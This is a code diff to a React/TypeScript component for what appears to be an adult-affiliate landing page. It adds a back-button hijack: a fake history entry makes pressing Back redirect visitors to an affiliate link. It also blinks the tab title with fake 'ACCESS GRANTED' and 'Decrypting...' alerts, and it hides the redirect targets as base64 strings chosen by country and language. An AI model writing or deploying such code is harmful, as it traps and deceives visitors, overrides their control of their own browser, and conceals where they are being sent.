@@ -102,9 +102,76 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
   
   const backgroundRef = useRef<HTMLDivElement>(null);
 
+  // Decrypt helper for redirect actions
+  const getDecryptedLink = () => {
+    const c = country.toUpperCase();
+    const tier1Countries = ["US", "GB", "CA", "AU", "NZ", "DE", "FR", "JP"];
+    const tier2Countries = [
+      "ES", "MX", "AR", "CO", "CL", "PE", "VE", "EC", "GT", "CR", "UY", "DO", "PR", "BO", "PY", "SV", "HN", "NI", "PA"
+    ];
+
+    let obfuscatedLink = OBFUSCATED_URLS.tier3; 
+    if (tier1Countries.includes(c)) {
+      obfuscatedLink = OBFUSCATED_URLS.tier1;
+    } else if (tier2Countries.includes(c) || detectedLang === "es") {
+      obfuscatedLink = OBFUSCATED_URLS.tier2;
+    }
+
+    try {
+      return atob(obfuscatedLink);
+    } catch (e) {
+      return "https://play.adultforce.com/redirect";
+    }
+  };
+
+  // 1. CRO Hack: Back-Button Hijack (Capturar el botón de retroceso)
+  useEffect(() => {
+    // Push an extra history state to create a fake back event
+    window.history.pushState(null, "", window.location.href);
+    
+    const handleBackButton = (e: PopStateEvent) => {
+      // Prevent back navigation and send directly to affiliate link
+      const targetUrl = getDecryptedLink();
+      window.location.replace(targetUrl);
+    };
+
+    window.addEventListener("popstate", handleBackButton);
+    return () => {
+      window.removeEventListener("popstate", handleBackButton);
+    };
+  }, [country, detectedLang]);
+
+  // 2. CRO Hack: Tab Visibility Alert (Recuperación de pestaña inactiva)
+  useEffect(() => {
+    const originalTitle = document.title;
+    let blinkInterval: NodeJS.Timeout | null = null;
+    
+    const handleVisibilityChange = () => {
+      if (document.hidden) {
+        // Blink tab title to draw attention
+        let showAlternate = false;
+        blinkInterval = setInterval(() => {
+          document.title = showAlternate 
+            ? (detectedLang === "es" ? "⚠️ ACCESO CONCEDIDO" : "⚠️ ACCESS GRANTED")
+            : (detectedLang === "es" ? "🔓 Desencriptando..." : "🔓 Decrypting...");
+          showAlternate = !showAlternate;
+        }, 1200);
+      } else {
+        // Restore title and stop blinker
+        if (blinkInterval) clearInterval(blinkInterval);
+        document.title = originalTitle;
+      }
+    };
+
+    document.addEventListener("visibilitychange", handleVisibilityChange);
+    return () => {
+      if (blinkInterval) clearInterval(blinkInterval);
+      document.removeEventListener("visibilitychange", handleVisibilityChange);
+    };
+  }, [detectedLang]);
+
   // Dynamic Browser Language & Timezone Lookup
   useEffect(() => {
-    // Detect preferred browser language with fallback to Spanish
     if (typeof window !== "undefined") {
       const mainLang = (window.navigator.language || "").split("-")[0].toLowerCase();
       const supported = ["es", "en", "fr", "ja", "it", "pt"];
@@ -140,25 +207,8 @@ export function BovedaClient({ country, city, isBot }: BovedaClientProps) {
   }, [city]);
 
   const handleRedirect = () => {
-    const c = country.toUpperCase();
-    const tier1Countries = ["US", "GB", "CA", "AU", "NZ", "DE", "FR", "JP"];
-    const tier2Countries = [
-      "ES", "MX", "AR", "CO", "CL", "PE", "VE", "EC", "GT", "CR", "UY", "DO", "PR", "BO", "PY", "SV", "HN", "NI", "PA"
-    ];
-
-    let obfuscatedLink = OBFUSCATED_URLS.tier3; 
-    if (tier1Countries.includes(c)) {
-      obfuscatedLink = OBFUSCATED_URLS.tier1;
-    } else if (tier2Countries.includes(c) || detectedLang === "es") {
-      obfuscatedLink = OBFUSCATED_URLS.tier2;
-    }
-
-    try {
-      const targetUrl = atob(obfuscatedLink);
-      window.location.href = targetUrl;
-    } catch (e) {
-      window.location.href = "https://play.adultforce.com/redirect";
-    }
+    const targetUrl = getDecryptedLink();
+    window.location.href = targetUrl;
   };
 
   // Supported Multilanguage Dict
